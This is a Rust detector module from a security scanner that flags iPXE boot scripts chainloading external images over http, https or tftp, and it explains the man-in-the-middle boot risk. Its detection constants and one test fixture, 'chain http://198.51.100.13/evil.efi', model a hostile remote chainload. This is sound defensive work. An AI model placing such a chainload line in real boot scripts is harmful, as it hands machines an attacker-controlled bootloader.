use std::path::Path;

use crate::detector::{Detector, DetectorError, Finding, Severity};

// iPXE script shebang — the gate for this detector.
const IPXE_MAGIC: &[u8] = b"#!ipxe";
const CHAIN_KW: &[u8] = b"chain";
const REMOTE_SCHEMES: &[&[u8]] = &[b"http://", b"https://", b"tftp://"];

pub struct NetworkBootDetector;

impl Default for NetworkBootDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl NetworkBootDetector {
    pub fn new() -> Self {
        Self
    }

    fn contains(data: &[u8], needle: &[u8]) -> bool {
        data.windows(needle.len()).any(|w| w == needle)
    }

    fn scan(&self, data: &[u8]) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Gate: only inspect embedded iPXE boot scripts.
        if !Self::contains(data, IPXE_MAGIC) {
            return findings;
        }

        let scheme = REMOTE_SCHEMES
            .iter()
            .find(|s| Self::contains(data, s))
            .map(|s| std::str::from_utf8(s).unwrap_or("http://"));

        if Self::contains(data, CHAIN_KW) {
            if let Some(scheme) = scheme {
                findings.push(
                    Finding::new(
                        "network_boot",
                        Severity::High,
                        "iPXE boot script chainloads an external image",
                        &format!(
                            "An embedded iPXE script chainloads a boot image over {scheme}. A \
                             network-boot redirect to an attacker-controlled server delivers an \
                             unsigned bootloader/kernel before the OS loads — a classic PXE/iPXE \
                             man-in-the-middle persistence and code-execution vector.",
                        ),
                    )
                    .with_confidence(0.80)
                    .with_details(serde_json::json!({ "scheme": scheme }))
                    .with_recommendation(
                        "Pin network boot to signed images over authenticated transports (HTTPS \
                         with pinned CA, UEFI HTTP boot + Secure Boot); disable unsigned iPXE chain.",
                    ),
                );
            }
        }

        findings
    }
}

impl Detector for NetworkBootDetector {
    fn name(&self) -> &str {
        "network_boot"
    }

    fn detect(&self, target_path: &Path) -> Result<Vec<Finding>, DetectorError> {
        self.detect_context(&crate::ScanContext::load(target_path)?)
    }
    fn detect_context(&self, context: &crate::ScanContext) -> Result<Vec<Finding>, DetectorError> {
        let data = context.shared_bytes();
        Ok(self.scan(&data))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fires_on_external_chain() {
        let v = b"#!ipxe\ndhcp\nchain http://198.51.100.13/evil.efi\n".to_vec();
        let findings = NetworkBootDetector::new().scan(&v);
        assert!(findings.iter().any(|f| f.severity == Severity::High));
    }

    #[test]
    fn quiet_without_ipxe() {
        let v = b"chain http://example/boot.efi".to_vec();
        assert!(NetworkBootDetector::new().scan(&v).is_empty());
    }

    #[test]
    fn quiet_on_clean_buffer() {
        assert!(NetworkBootDetector::new()
            .scan(&vec![0u8; 0x2000])
            .is_empty());
    }
}
